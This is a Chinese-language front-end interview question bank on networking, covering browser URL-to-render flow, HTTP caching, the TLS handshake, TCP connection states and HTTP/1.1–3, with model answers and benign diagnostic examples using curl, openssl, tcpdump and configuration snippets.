---
id: network
name: 网络与 HTTP
en: Network & HTTP
icon: globe
color: #0ea5e9
order: 10
desc: 缓存、跨域、HTTPS 与协议演进，最能体现技术深度的一块。
---

## 01 · 从输入 URL 到页面展示，中间发生了什么

@id
network-url-to-page

@level
进阶

@freq
3

@tags
URL | DNS | 渲染

@ask
你跟我说说，在浏览器地址栏里敲下一个网址、按下回车，到页面完全展示出来，中间到底经历了哪些阶段？别只背流程，我想听你按时间线把网络部分和渲染部分都讲清楚，最好再带一个你实际排查过白屏或者加载慢的例子。

@oral
**一句话结论**：整个过程可以拆成「网络请求」和「渲染流水线」两大阶段，前者负责把资源拿到手，后者负责把字节变成屏幕上的像素，中间还穿插着各种缓存和优化的博弈。

**先说网络部分**。浏览器拿到 URL 之后先做的不是发请求，而是**解析 URL 并查缓存**：把 scheme、host、path 拆出来，然后去 Service Worker、Memory Cache、Disk Cache 里看这个资源是否已经存在、有没有过期。命中强缓存就直接读本地，连网络都不走。没命中才进入真正的网络链路：**DNS 解析**把域名变成 IP（浏览器会缓存、操作系统会缓存、本地还有 hosts），拿到 IP 后**建立 TCP 连接**（三次握手），如果是 HTTPS 还要**再走一遍 TLS 握手**协商出对称密钥，之后才发出 HTTP 请求、接收响应。这里有个容易被忽略的点：现代浏览器对同一个 host 会**复用连接（keep-alive）**，而且会**提前做 DNS 预解析和 TCP/TLS 预连接（preconnect）**，这些都会压缩这段耗时。

**再说渲染部分**。拿到 HTML 之后浏览器边下载边解析，构建 **DOM 树**；碰到 CSS 就并行构建 **CSSOM**；两者合成 **Render Tree（渲染树）**；然后**布局（Layout/Reflow）**算出每个节点的几何位置，**绘制（Paint）**生成图层绘制指令，**合成（Composite）**交给 GPU 把图层合成成最终画面。JS 是这条线上的「破坏者」：遇到不带 defer/async 的外联 `<script>` 会**阻塞 HTML 解析**，所以脚本通常放 body 末尾或用 defer。

**讲一个我真实排查过的例子**。有一次首屏白屏 3 秒，我先用 Performance 面板录制，发现 Long Task 集中在 `Parse HTML` 阶段，顺着瀑布流看到是一个同步的大 JSON 解析卡住了主线程。我把那个 800KB 的 JSON 改成**分片流式解析 + 放 Web Worker**，白屏时间从 3 秒降到 600 毫秒。这个例子说明：单纯背流程没用，得知道哪一阶段会卡、用什么工具去定位。

**边界与取舍**。不是每个资源都要走完整链路——强缓存、HTTP/2 多路复用、preload/preconnect 都是在不同阶段做「省时间」的优化；但优化过头也有代价，比如 preload 错资源会挤占带宽、DNS prefetch 太多会浪费电量。所以真正的功夫在于**按关键渲染路径（CRP）去排优先级**：先保证 HTML、首屏 CSS、关键 JS 尽快到位，其余资源延迟或懒加载。

**收尾**：一句话讲，就是「先缓存、再建连、再请求、再解析、再渲染」，而资深工程师的价值在于能定位这条链上哪一环是瓶颈，并用对工具和优化手段把它削平。

@points
整体分网络请求与渲染流水线两大阶段，二者在不同环节都有缓存与优化介入
强缓存命中可完全跳过网络，DNS/TCP/TLS 是网络阶段耗时大头，连接可复用、可预建
渲染核心是 DOM + CSSOM → 渲染树 → 布局 → 绘制 → 合成，JS 会阻塞解析需谨慎放置
关键渲染路径（CRP）上要按优先级分配带宽，非关键资源延迟或懒加载
排查要落到工具（Performance / Network 面板 / 瀑布流）与具体阶段，而非空背流程

@steps
解析 URL 并拆解 scheme/host/path，依次查 Service Worker、Memory、Disk 缓存
未命中缓存则做 DNS 解析（含各级缓存），拿到目标服务器 IP
建立 TCP 连接（三次握手），HTTPS 场景再完成 TLS 握手得到对称密钥
发出 HTTP 请求并接收响应，按内容类型开始处理（HTML 触发解析）
流式解析 HTML 构建 DOM，并行构建 CSSOM，遇到脚本按规则阻塞或异步执行
合成渲染树 → 布局 → 绘制 → 合成上屏，期间触发首屏与可交互时机

@followups
为什么把 script 放 body 末尾或用 defer？——不带 defer/async 的外联脚本会阻塞 HTML 解析（Parser Blocking），defer 会延后到 DOM 解析完按顺序执行，async 加载完就执行不保证顺序
preload 和 prefetch 有什么区别？——preload 是当前页面立刻要用、优先级高、必须指定 as；prefetch 是预测下一页可能用、优先级低、空闲时才取
什么是关键渲染路径？——浏览器把 HTML/CSS/JS 变成首屏像素的最短必经步骤，优化的核心是减少 CRP 长度与关键资源体积

@example
### 1. 用 curl 观察一次完整请求的网络阶段耗时

```bash
# -w 自定义输出格式，把各阶段耗时打出来
# time_namelookup = DNS 解析耗时
# time_connect    = TCP 建连耗时（到三次握手完成）
# time_appconnect = TLS 握手耗时（仅 HTTPS 有值）
# time_starttransfer = 从请求到收到第一个字节（TTFB）
# time_total      = 总耗时
curl -o /dev/null -s -w '
DNS 解析  : %{time_namelookup}s
TCP 建连  : %{time_connect}s
TLS 握手  : %{time_appconnect}s
首字节TTFB: %{time_starttransfer}s
总耗时    : %{time_total}s
' https://example.com

# 想看更细的连接复用情况，可以打开详细日志
curl -v --http1.1 https://example.com 2>&1 | grep -i 'reused\|connected\|SSL connection'
```

### 2. 浏览器对连接的复用与预连接（index.html 里的提示）

```html
<!-- 提前把下个页面要用的域名做 DNS 预解析，省掉用户点击时的解析耗时 -->
<link rel="dns-prefetch" href="https://cdn.example.com">

<!-- 更进一步：把 DNS + TCP + TLS 三步都提前建好，适合首屏关键第三方域 -->
<link rel="preconnect" href="https://api.example.com" crossorigin>

<!-- 声明首屏关键资源，让浏览器高优先级提前下载，不阻塞解析 -->
<link rel="preload" as="script" href="/critical.js">
<link rel="preload" as="style" href="/above-the-fold.css">

<!-- 非关键脚本用 defer，等 DOM 解析完再按顺序执行，不阻塞渲染 -->
<script src="/analytics.js" defer></script>
```

### 3. 用 Performance 面板定位「哪一阶段卡了」

```text
# 录制一段首屏加载，时间轴大致长这样（自上而下是不同阶段）：
# Network      下载 HTML / CSS / JS / 图片，瀑布流看哪个资源慢
# Parse HTML   解析 HTML 构建 DOM，遇到同步脚本会停在这里
# Layout       布局重排，JS 频繁读写几何属性会反复触发
# Paint        绘制，大范围样式变化会拖慢这里
# Composite    合成上屏，一般很快，除非图层过多
#
# 真实排查：白屏 3s，发现 Long Task 全在 Parse HTML
# 顺着调用栈看到一个 800KB 的 JSON 在主线程同步 JSON.parse
# 改造：切成流式解析 + 丢进 Web Worker，白屏降到 600ms
```

### 4. 一道常被追问的「重定向」插曲

```http
# 输入 example.com（不带协议和 www），浏览器实际会经历多次跳转
# 第一次：补全协议，301 到 https
HTTP/1.1 301 Moved Permanently
Location: https://example.com

# 第二次：补全 www，301 到带 www 的地址
HTTP/1.1 301 Moved Permanently
Location: https://www.example.com

# 第三次才返回 200 的真实页面
HTTP/1.1 200 OK
Content-Type: text/html

# 优化手段：前端可在入口处直接写全 https://www.example.com
# 服务端用 HSTS（Strict-Transport-Security）让浏览器记住只走 HTTPS
# 避免每次都多一次 301 往返，这就是在「网络阶段」省时间
```

## 02 · HTTP 缓存：强缓存与协商缓存怎么配合

@id
network-cache

@level
进阶

@freq
3

@tags
强缓存 | 协商缓存 | Cache-Control

@ask
HTTP 缓存你肯定用过，但我想听你把强缓存和协商缓存讲透：它们俩到底谁先谁后、怎么配合？Cache-Control 里那些指令都是什么意思？还有，一个文件内容更新了，你怎么保证用户能立刻拿到新版本而不是旧的缓存？

@oral
**一句话结论**：强缓存和协商缓存是**两层兜底**的关系——强缓存优先、命中就直接用、连请求都不发；没命中才走协商缓存，拿着「校验标识」去问服务端「我这份还新鲜吗」，服务端说没变就回 304 复用、说变了就回 200 带新内容。

**先讲强缓存**。它由响应头里的 `Cache-Control` 和 `Expires` 控制，核心是「在有效期之内，浏览器自己说了算，不发请求」。现代都用 `Cache-Control: max-age=3600`（单位是秒，相对时间，比 Expires 的绝对时间更靠谱，不受本地时钟影响）。还有两个关键修饰：`public` 表示任何中间代理都能缓存，`private` 表示只能客户端缓存；`no-cache` **不是不缓存**，而是「用之前必须先去服务端协商一下」，相当于强制走一遍协商缓存；`no-store` 才是真的一点都不存。

**再说协商缓存**。当强缓存过期（或者标了 no-cache），浏览器就带上之前存的校验标识去问服务端。标识有两套：**Last-Modified / If-Modified-Since**（基于最后修改时间，精度到秒，1 秒内多次改动会失效，且文件内容没变只是改了时间也会误判）和 **ETag / If-None-Match**（基于内容哈希，更精确，优先级高于 Last-Modified）。服务端比对后，没变就回 `304 Not Modified`、正文为空，浏览器拿缓存接着用；变了就回 `200` 带新正文。

**讲个真实踩坑**。我们以前发版后用户总说「页面没更新」，排查发现构建出来的 JS 文件名没带 hash，文件名稳定、强缓存又设了一年，浏览器死活不重新请求。后来改成**内容哈希文件名**（`app.3a9f.js`），HTML 本身设 `no-cache` 每次协商、而带 hash 的静态资源设一年强缓存。这样内容一变 hash 就变、URL 就变、必然是全新请求；没变就一直命中强缓存，彻底解决了「更新不生效」和「缓存不生效」这对矛盾。

**边界与取舍**。强缓存时间设太长，发版更新慢；设太短，缓存收益低。业界标准做法就是「HTML 走协商（或短缓存）+ 静态资源走带 hash 的长强缓存」。另外 `must-revalidate`、`immutable` 这些指令在 CDN 和代理场景也值得了解，但基础面试把 max-age、no-cache、no-store、ETag、304 这套讲明白就够深了。

**收尾**：强缓存是「自己判断新鲜」，协商缓存是「问服务端还新鲜不」，二者先后顺序固定、互为兜底；工程上靠「hash 文件名 + 分层缓存策略」把两者优点都吃满。

@points
强缓存命中不发请求、自己判定有效期，靠 Cache-Control 的 max-age（相对时间优于 Expires）
no-cache 是强制走协商、no-store 才真不缓存；public/private 控制谁能存
协商缓存用 Last-Modified 或 ETag 校验，304 复用旧体、200 带新体，ETag 优先级更高
Last-Modified 精度到秒且依赖修改时间，ETag 基于内容哈希更可靠
工程解法：HTML 短缓存/协商 + 静态资源带 hash 长强缓存，更新即换 URL

@steps
浏览器请求资源，先查强缓存：未过期且非 no-cache 则直接读本地，流程结束
强缓存过期（或 no-cache），进入协商：带上 If-Modified-Since / If-None-Match
服务端比对修改时间或 ETag，未变返回 304、正文为空
浏览器收到 304，复用本地缓存副本，更新有效期
若内容已变，服务端返回 200 与新正文，浏览器缓存新内容
发版时靠 hash 文件名换 URL，使强缓存资源天然失效，HTML 走协商拿最新

@followups
no-cache 和 no-store 到底差在哪？——no-cache 仍会缓存但使用前必须协商（可能 304），no-store 完全不落盘、每次都重新请求
ETag 和 Last-Modified 哪个优先？——ETag 优先；二者都在时服务端以 ETag 为准，因为哈希比修改时间更精确
强缓存时间设多久合适？——静态资源带 hash 可设一年（max-age=31536000），HTML 设 no-cache 或很短，保证发版可见

@example
### 1. 强缓存：响应头与浏览器行为

```http
# 服务端返回：资源一年内有效，且任何代理都可缓存
HTTP/1.1 200 OK
Content-Type: application/javascript
Cache-Control: public, max-age=31536000, immutable
ETag: "3a9f1c"
Date: Mon, 11 Sep 2026 08:00:00 GMT

# 浏览器在这一年内再次请求同一 URL：
# 1. 直接读 Disk/Memory Cache，Network 面板显示 `200 (from cache)` 或 `memory cache`
# 2. 完全不发网络请求，状态栏耗时接近 0ms
# 3. immutable 告诉浏览器：有效期内连协商都别问，进一步省去 304 往返
```

### 2. 协商缓存：304 的完整往返

```http
# 第一次请求，服务端给校验标识
HTTP/1.1 200 OK
Last-Modified: Mon, 11 Sep 2026 07:00:00 GMT
ETag: "3a9f1c"
Cache-Control: no-cache

# 第二次请求，浏览器带上两个标识去问
GET /app.js HTTP/1.1
If-Modified-Since: Mon, 11 Sep 2026 07:00:00 GMT
If-None-Match: "3a9f1c"

# 服务端比对后内容没变，回 304（正文为空，省带宽）
HTTP/1.1 304 Not Modified
ETag: "3a9f1c"
Cache-Control: no-cache
# 浏览器复用本地缓存副本，更新新鲜度即可
```

### 3. 用 curl 验证缓存是否命中

```bash
# 第一次请求，记录下 ETag
curl -s -D - -o /dev/null https://example.com/app.js | grep -i etag

# 第二次带上 If-None-Match，看是不是 304
curl -s -D - -o /dev/null \
  -H 'If-None-Match: "3a9f1c"' \
  https://example.com/app.js | head -n 1
# 输出 HTTP/1.1 304 Not Modified 说明协商命中

# 直接看响应头里完整的缓存指令
curl -s -I https://example.com/style.css
```

### 4. 前端构建产物如何落地 hash 缓存策略

```javascript
// vite.config.ts：给静态资源文件名注入内容哈希
export default {
  build: {
    // 带 hash 的输出，例如 assets/index.3a9f1c.js
    assetsDir: 'assets',
    rollupOptions: {
      output: {
        // 文件名带 hash，内容一变 hash 就变，URL 自然失效
        filename: 'assets/[name].[hash].js',
        chunkFilename: 'assets/[name].[hash].js',
      },
    },
  },
}
// 配合服务端对 /assets/* 设 `Cache-Control: max-age=31536000, immutable`
// 对入口 index.html 设 `Cache-Control: no-cache`
// 这样发版后 HTML 立刻协商到新引用，旧资源靠 hash 差异天然不冲突
```

## 03 · HTTPS 握手过程，为什么既用对称又用非对称加密

@id
network-https

@level
进阶

@freq
3

@tags
HTTPS | TLS | 加密

@ask
HTTPS 你肯定知道是加密的，但我想听你把 TLS 握手一步步讲出来：客户端和服务端到底交换了哪些东西？为什么不全用非对称加密，而是要对称和非对称配合着用？证书又是干嘛的，怎么保证中间人没法伪造？

@oral
**一句话结论**：HTTPS = HTTP + TLS，TLS 握手的目标是用**非对称加密安全地协商出一把临时的对称密钥**，之后全程用**对称加密**传输应用数据。这么做是因为非对称加密太慢、对称加密不够安全（密钥没法安全送达），二者互补。

**先讲握手流程（以 TLS 1.2 为例，1.3 更激进后面说）**。第一步，客户端发 `Client Hello`，带上支持的 TLS 版本、密码套件列表、和一个随机数 `Client Random`。第二步，服务端回 `Server Hello`，选定版本和套件，并返回自己的 `Server Random` 和**数字证书（含公钥）**。第三步，客户端**验证证书**：用内置 CA 根证书去校验证书链的签名、域名是否匹配、有没有过期——这一步就是防中间人的核心。验证通过后，客户端生成一个 `Pre-Master Secret`，用证书里的**服务端公钥加密**发过去（只有私钥能解开，所以即使被截获也没用）。第四步，双方各自用 `Client Random + Server Random + Pre-Master` 算出同一个**对称密钥（Master Secret）**。之后所有 HTTP 数据都用这把对称密钥加密，走 `Finished` 消息确认握手完整。

**为什么非对称和对称要配合**？非对称加密（RSA/ECC）的好处是公钥可以公开、私钥自己藏好，能解决「密钥分发」问题；但它**计算极慢**，如果整条连接都用它加密数据，吞吐会掉一个数量级。对称加密（AES）**极快**，但难点在于「怎么把密钥安全地交到对方手里」——如果直接明文发密钥，被截获就全完了。所以 TLS 的聪明之处在于：**用慢但安全的非对称加密，只用来传递/协商那一把对称密钥**，之后海量数据都交给快且轻的对称加密。等于把两者的优点拼起来了。

**讲个真实场景**。我们做内部服务间调用时一度为了省事只验证了证书存在、没严格校验证书链和域名，结果测试环境被人用自签证书做了中间人，凭证泄露。修复就是启用**双向校验（mTLS）**：不仅客户端验服务端，服务端也验客户端证书，并严格比对 SAN 域名和吊销状态（OCSP/CRL）。这正好印证了「证书验证那一步不能省」。

**边界与取舍**。TLS 1.3 把握手从 2-RTT 压到 **1-RTT**（甚至 0-RTT 恢复），并且废掉了不安全的 RSA 密钥交换，只允许前向安全的 ECDHE——也就是每次会话的密钥独立，即使长期私钥泄露，历史流量也解密不了。这是现在面试加分项：能说出 1.2 和 1.3 的差异，尤其**前向安全**。

**收尾**：非对称负责「安全地把对称密钥送过去」，对称负责「高效地加密后续数据」，证书负责「证明对方是真的、不是中间人」；这样既安全又高性能。

@points
TLS 用非对称加密安全协商出对称密钥，之后全程对称加密，兼顾安全与性能
握手关键产物：Client/Server Random + Pre-Master，双方各自算出相同的 Master Secret
证书由 CA 签名，客户端用内置根证书校验链、域名、有效期，这是防中间人的核心
非对称慢但能解决密钥分发，对称快但密钥难安全送达，二者互补而非二选一
TLS 1.3 压到 1-RTT 并强制前向安全（ECDHE），即使私钥泄露历史流量也安全

@steps
客户端发 Client Hello：TLS 版本、密码套件列表、Client Random
服务端回 Server Hello：选定套件、Server Random，并下发数字证书（含公钥）
客户端校验证书链、域名、有效期，确认服务端身份真实
客户端生成 Pre-Master，用服务端公钥加密后发给服务端（仅私钥可解）
双方用 Client/Server Random + Pre-Master 各自算出相同对称密钥
切换为对称加密，发送 Finished 确认握手完整，之后应用数据加密传输

@followups
为什么不直接全程用非对称加密？——非对称加解密计算开销大、吞吐低，只适合传少量关键数据（如协商密钥），不适合加密海量业务流量
证书是怎么防止中间人造假的？——证书由受信任 CA 用私钥签名，客户端用预置的根证书公钥验签；中间人没有合法私钥，无法伪造出能通过校验的证书
TLS 1.2 和 1.3 握手差在哪？——1.3 只需 1 个 RTT（1.2 要 2 个），并强制前向安全的 ECDHE、废弃静态 RSA 密钥交换

@example
### 1. 用 openssl 亲手抓一次 TLS 握手消息

```bash
# s_client 连上去，能看到服务端下发的证书和协商出的密码套件
openssl s_client -connect example.com:443 -servername example.com

# 只看证书详情（颁发者、域名 SAN、有效期、公钥算法）
echo | openssl s_client -connect example.com:443 2>/dev/null \
  | openssl x509 -noout -issuer -subject -dates

# 指定用 TLS1.3 看协商到的版本与套件，验证是否走了 1.3
openssl s_client -tls1_3 -connect example.com:443 2>/dev/null \
  | grep -i 'Protocol\|Cipher'

# 验证证书链是否完整可信（返回 OK 说明链和域名都没问题）
openssl verify -CAfile /etc/ssl/certs/ca-certificates.crt example.com.crt
```

### 2. TLS 握手的消息顺序（简化视图）

```text
# 客户端                                服务端
# Client Hello  ───────────────────────▶  版本/套件/Client Random
#            ◀───────────────────────  Server Hello + Server Random
#            ◀───────────────────────  证书（含公钥，CA 签名）
#            ◀───────────────────────  Server Key Exchange（ECDHE 时）
#            ◀───────────────────────  Server Hello Done
# Client Key Exchange（Pre-Master 用公钥加密）▶
# Change Cipher Spec + Finished        ▀───────────────────────▶
#            ◀───────────────────────  Change Cipher Spec + Finished
# ===== 此后所有 HTTP 数据用协商出的对称密钥加密 =====
#
# TLS 1.3 把上面 2 个 RTT 压缩成 1 个：
# Client Hello 里就带上 Key Share（提前交换椭圆曲线参数）
# 服务端回 Hello + 自己的 Key Share，双方立刻能算出密钥，少一轮往返
```

### 3. 前端 / Node 侧如何强制校验证书和域名

```javascript
// Node 请求外部 HTTPS 接口时，默认会校验证书；可手动强化
const https = require('https')
const options = {
  hostname: 'api.example.com',
  port: 443,
  path: '/v1/user',
  method: 'GET',
  // 严格模式：证书链、域名、有效期任一不符都直接报错（不要图省事关掉）
  rejectUnauthorized: true,
  // 指定允许的域名，防止证书合法但域名不对的「错绑」情况
  checkServerIdentity: (host, cert) => {
    // 默认实现已校验 cert.subjectAltName 是否包含 host
    return undefined
  },
}
https.request(options, (res) => {
  console.log('status', res.statusCode)
}).on('error', (e) => {
  // 真实踩坑：测试环境自签证书曾被中间人替换，正是这里抛出证书错误才暴露
  console.error('证书校验失败，疑似中间人：', e.message)
}).end()
```

### 4. 双向认证（mTLS）：服务端也验客户端

```nginx
# 服务端 Nginx 开启双向校验，不仅验客户端、也验客户端证书
server {
    listen 443 ssl;
    ssl_certificate     /etc/nginx/certs/server.crt;
    ssl_certificate_key /etc/nginx/certs/server.key;

    # 开启客户端证书校验，并指定受信任的客户端 CA
    ssl_client_certificate /etc/nginx/certs/client-ca.crt;
    ssl_verify_client on;  # on=强制校验，optional=可选

    location /internal/ {
        # 校验不通过直接 400，从源头挡掉未授权调用
        if ($ssl_client_verify != SUCCESS) { return 400; }
        proxy_pass http://backend;
    }
}
# 配合 OCSP/CRL 检查证书是否已被吊销，避免离职员工证书仍可用
```

## 04 · TCP 三次握手、四次挥手，为什么不能只握两次

@id
network-tcp

@level
进阶

@freq
3

@tags
TCP | 握手 | 挥手

@ask
你讲讲 TCP 的三次握手和四次挥手，把每一步发的标志位和状态变化说清楚。我重点想问：为什么握手一定是三次、不能两次搞定？挥手为什么又要四次，而不是三次？

@oral
**一句话结论**：TCP 是面向连接的可靠协议，三次握手是为了**让双方都确认「自己能发、对方能收」这件事成立**，少一次就会导致有一方不知道对方是否准备好了；四次挥手是因为 TCP 是全双工的，关闭连接时「我发完了」和「你发完了」要分两条通道各自确认。

**先讲三次握手**。客户端主动打开，发 `SYN`（seq=x），进入 `SYN_SENT`；服务端回 `SYN+ACK`（seq=y, ack=x+1），进入 `SYN_RCVD`；客户端再回 `ACK`（ack=y+1），双方进入 `ESTABLISHED`，连接建立。这里两次携带初始序列号（ISN），是为了**同步双向的起始序号**，保证后续数据能按序重组、不串包。

**为什么不能两次**？关键在于：两次握手的话，服务端在收到 SYN 并回 SYN+ACK 后，就**单方面认为连接建好了**并开始分配资源、发数据；但客户端到底收没收到、是不是一个早已失效的旧 SYN（网络延迟导致的「历史连接」），服务端无从得知。如果客户端根本没收到，服务端就一直空等、资源被占——这就是**SYN 泛洪攻击**能吃资源的根源之一。第三次 ACK 让服务端确认「客户端确实活著且收到了我的回应」，双方状态才真正对齐。一句话：**两次只能证明「客户端能到服务端」，证明不了「服务端能回到客户端」，而可靠通信需要双向都验证。**

**再说四次挥手**。连接关闭时，A 发 `FIN`（表示「我这边没数据要发了」），进 `FIN_WAIT_1`；B 回 `ACK`，进 `CLOSE_WAIT`，A 收到后进 `FIN_WAIT_2`；此时 B 可能还有数据没发完，所以要等自己发完了再发 `FIN`，进 `LAST_ACK`；A 回 `ACK` 进 `TIME_WAIT`，等 2MSL 后真正关闭，B 收到 ACK 立即关闭。

**为什么是四次而不是三次**？因为收到对方的 FIN 只代表「对方不再发数据」，但**自己这边的数据可能还没发完**，所以 ACK 和 FIN 不能像握手时那样合并成一个包——必须先把 ACK 立刻回掉（让对方知道 FIN 收到了），等自己数据发完再单独发 FIN。这就是「半关闭（half-close）」状态存在的意义。**TIME_WAIT 等 2MSL** 则是为了：① 保证最后一个 ACK 能可靠到达（丢了对方会重发 FIN）；② 让本连接的残留报文在网络中自然消亡，避免新连接收到旧数据。

**边界与取舍**：服务器上大量 `TIME_WAIT` 会占端口，可通过 `tcp_tw_reuse`、连接池、或让客户端主动关来缓和；而 `CLOSE_WAIT` 堆积往往是代码没正确 close 连接导致，是真实线上常见故障。

**收尾**：三次握手同步双向序号、确认双方收发能力；四次挥手因为全双工、半关闭而不可合并；理解状态机比背步骤更重要。

@points
三次握手同步双方初始序列号，并双向确认「我能发、你能收」，缺一次则有一方状态未知
两次握手会让服务端盲等资源、易被历史 SYN 误导，也无法防 SYN 泛洪
四次挥手源于 TCP 全双工：收到 FIN 只代表对方发完，自己数据可能未发完，ACK 与 FIN 不能合并
TIME_WAIT 等 2MSL 是为保证最后 ACK 可靠到达并让旧报文消亡，不是多余
CLOSE_WAIT 堆积通常是代码未正确关闭连接，TIME_WAIT 过多可借连接池/复用缓解

@steps
客户端发 SYN（带 ISN），进入 SYN_SENT，请求建立连接
服务端回 SYN+ACK，进入 SYN_RCVD，确认并同步自己的序号
客户端回 ACK，双方进入 ESTABLISHED，三次握手完成
主动方发 FIN 进入 FIN_WAIT_1，被动方回 ACK 进入 CLOSE_WAIT
被动方数据发完后发 FIN 进入 LAST_ACK，主动方回 ACK 进入 TIME_WAIT
主动方等 2MSL 后彻底关闭，被动方收到 ACK 立即关闭

@followups
为什么握手三次、挥手四次？——握手时服务端的 SYN 和 ACK 可合并在一个包；挥手时被动方要先 ACK 再等自己数据发完才 FIN，无法合并
TIME_WAIT 为什么要等 2MSL？——确保最后一个 ACK 到达（否则对方重发 FIN），并让本连接旧报文在网络中过期
大量 CLOSE_WAIT 是什么问题？——被动方没发 FIN，通常是应用层没调用 close/释放连接，连接泄漏，需查代码何时关闭 socket

@example
### 1. 用 tcpdump 抓三次握手和四次挥手的实际包

```bash
# 抓某主机 80 端口的 TCP，重点看 Flags [S]/[S.]/[.] 和 [F]
sudo tcpdump -i any -nn 'host 93.184.216.34 and port 80' -c 20

# 你会看到（简化）：
# 客户端 > 服务端: Flags [S]   seq=0        -> 第一次握手 SYN
# 服务端 > 客户端: Flags [S.]  seq=0 ack=1  -> 第二次 SYN+ACK
# 客户端 > 服务端: Flags [.]   seq=1 ack=1  -> 第三次 ACK，连接建立
# ...数据传输...
# 客户端 > 服务端: Flags [F.]  seq=... ack=... -> 主动方 FIN
# 服务端 > 客户端: Flags [.]   ack=...         -> 回 ACK
# 服务端 > 客户端: Flags [F.]  seq=... ack=... -> 被动方 FIN
# 客户端 > 服务端: Flags [.]   ack=...         -> 最后 ACK，进入 TIME_WAIT
```

### 2. 用 netstat 观察连接状态

```bash
# 看当前所有 TCP 连接的状态分布，排查 TIME_WAIT / CLOSE_WAIT 堆积
netstat -ant | awk '{print $6}' | sort | uniq -c | sort -rn

# 只盯 CLOSE_WAIT，这往往是代码没 close 连接的信号
netstat -ant | grep CLOSE_WAIT

# ss 更轻量，看某端口监听与连接
ss -tanp | grep ':8080'
```

### 3. Node 里观察 FIN 与半关闭

```javascript
// 服务端：正常关闭连接，先回 ACK 再发 FIN（体现四次挥手的分离）
const net = require('net')
const server = net.createServer((socket) => {
  socket.on('data', (buf) => {
    socket.write('echo: ' + buf) // 先把剩余数据发完
  })
  // 客户端发 FIN 后，这里触发 end；调用 end() 才会回自己的 FIN
  socket.on('end', () => {
    socket.end() // 发送 FIN，进入 LAST_ACK，而不是立刻销毁
  })
})
server.listen(8080)

// 客户端：主动关闭，会先发 FIN，进入 FIN_WAIT_2 等对方 FIN
const client = net.connect(8080, '127.0.0.1', () => {
  client.write('hello')
  client.end() // 发送 FIN，表示「我发完了」
})
```

### 4. 内核参数调优（服务端缓解 TIME_WAIT 过多）

```bash
# 允许 TIME_WAIT 状态的 socket 被新连接安全复用（客户端侧更安全）
# 仅对「出方向」连接生效，能显著减少本机作为客户端的端口占用
sysctl -w net.ipv4.tcp_tw_reuse=1

# 开启时间戳，配合 tw_reuse 才能生效
sysctl -w net.ipv4.tcp_timestamps=1

# 注意：不要开 tcp_tw_recycle，它在 NAT 环境下会导致丢包，已被内核废弃
# 根本解法仍是连接池复用 + 让客户端主动关闭，避免服务端堆积
```

## 05 · HTTP/1.1、HTTP/2、HTTP/3 的演进与各自的优化

@id
network-http-version

@level
高级

@freq
3

@tags
HTTP2 | HTTP3 | QUIC

@ask
HTTP 这几个版本你用过吧，我想听你横向对比一下 1.1、2、3：每个版本主要解决了前一个版本的什么痛点？HTTP/2 的多路复用到底解决了什么？HTTP/3 为什么干脆换了传输层、不用 TCP 了？

@oral
**一句话结论**：三个版本是「在延迟和并发上不断打补丁」的过程——HTTP/1.1 解决了无连接的问题但留下了队头阻塞，HTTP/2 用二进制分帧和多路复用解决了应用层队头阻塞，HTTP/3 换掉 TCP、改用基于 UDP 的 QUIC，连**传输层的队头阻塞**也一起解决掉。

**先说 HTTP/1.1 做了什么**。它相对 1.0 最重要是默认开启**持久连接（keep-alive）**，一个 TCP 连接可以串行复用多个请求，不必每请求建一次连接；还加了**管线化（pipelining）**允许连续发请求但响应必须按序返回，实际很少用；还有分块传输、缓存控制、断点续传等。但 1.1 的硬伤是**队头阻塞（Head-of-Line Blocking）**：同一连接上请求必须排队，前一个响应慢，后面全卡住；浏览器于是只能开**最多 6 个并发连接**来缓解，于是又带来连接竞争和开销。前端只好用「雪碧图、域名分片、合并文件」这些歪招去绕。

**HTTP/2 的核心优化**。它把报文拆成**二进制帧（frame）**，在一条 TCP 连接上用**流（stream）**做多路复用：多个请求/响应可以拆成帧交错发送，互不阻塞，真正解决了**应用层队头阻塞**。还带来：① **头部压缩（HPACK）**，去掉重复头部、用索引表，省大量字节；② **服务端推送（Server Push）**，服务端可主动推资源（实际因缓存控制复杂已少用）；③ **优先级与流控**。但要注意：HTTP/2 的多路复用是建立在**单一 TCP 连接**上的，一旦这个 TCP 包丢了，**整个连接的所有流都要等重传**——这就是**传输层队头阻塞**，TCP 的可靠有序反而成了瓶颈。

**HTTP/3 为什么换传输层**。它把 TCP 换成基于 UDP 的 **QUIC**：QUIC 在用户态实现了可靠传输、拥塞控制，并且**每个流独立**、一个流丢包不影响其他流，从根上消灭了传输层队头阻塞。QUIC 还把** TLS 1.3 内置**进握手，0-RTT/1-RTT 建连，连接迁移（换 IP 不断流，靠 Connection ID）对移动端极友好。代价是 UDP 可能被部分网络丢弃、以及 QUIC 实现复杂。

**讲个真实优化**。我们首屏把静态资源从 1.1 迁到 HTTP/2 后，原来为了绕队头阻塞做的「域名分片（static1/2/3.example.com）」反而成了负优化——多个域名意味着多条 TCP + 多次 TLS 握手，反而没用上 2 的单一连接多路复用。我们**收敛域名到同一个**，首屏请求数虽多但都在一条连接里交错，加载快了约 20%。这正说明：优化手段要跟着协议版本走，旧经验在新协议下可能反效果。

**边界与取舍**：HTTP/2 在丢包率高的弱网反而可能不如 1.1（单连接全阻塞），HTTP/3 需要服务端和 CDN 支持、且 UDP 穿透有风险。选型上现在主流是「2 兜底、3 择优、1.1 兼容」。

**收尾**：1.1 治了无连接、留下应用层阻塞；2 治了应用层阻塞、留下传输层阻塞；3 换 QUIC 把传输层阻塞也治了，代价是实现与网络兼容。

@points
HTTP/1.1 默认持久连接解决反复建连，但同连接串行导致应用层队头阻塞，浏览器只能开 6 个并发
HTTP/2 用二进制分帧 + 流多路复用消除应用层队头阻塞，并带来 HPACK 头部压缩
HTTP/2 仍跑在单条 TCP 上，TCP 丢包会让整条连接重传，存在传输层队头阻塞
HTTP/3 改用 UDP 上的 QUIC，流间独立、内置 TLS1.3、支持连接迁移，消灭传输层阻塞
协议升级后旧优化手段（如域名分片）可能变负优化，需重新审视

@steps
HTTP/1.1：持久连接复用 TCP，但请求串行、受应用层队头阻塞，靠多连接并发缓解
HTTP/2：单 TCP 连接内二进制分帧，多流交错传输，消除应用层阻塞
HTTP/2：HPACK 压缩头部、可设流优先级，进一步降体积提效率
HTTP/2 痛点：单 TCP 丢包致全连接等待，即传输层队头阻塞
HTTP/3：以 QUIC（UDP）替代 TCP，每流独立、不互相阻塞
HTTP/3：内置 TLS1.3 快速握手 + Connection ID 支持换网不断流

@followups
HTTP/2 多路复用解决了什么？——解决同域名下多个请求在 1.1 里排队的应用层队头阻塞，一条连接上帧可交错，无需开多连接
